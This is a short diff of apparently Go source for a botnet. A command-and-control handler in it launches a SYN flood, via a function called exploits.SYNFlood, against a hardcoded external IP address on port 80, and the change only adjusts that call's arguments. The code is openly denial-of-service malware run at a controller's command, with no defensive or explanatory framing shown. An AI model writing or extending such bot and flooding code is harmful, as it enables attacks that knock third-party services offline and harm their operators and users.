@@ -87,7 +87,7 @@ func (b *Bot) HandleCommandFromCC(c *protocol.Command) error {
 		}})
 	case protocol.CommandTypeSynflood:
 		log.Printf("[cmd&ctrl] [[%s]] synflood requested by command and control at %d", c.Type, time.Now().Unix())
-		return exploits.SYNFlood("151.101.194.133", 80, 20, 4, true)
+		return exploits.SYNFlood("151.101.194.133", 80, 20, 4)
 	default:
 		log.Printf("[cmd&ctrl] [[%s]] unhandled event type at %d. full command: %v", c.Type, time.Now().Unix(), *c)
 		return nil
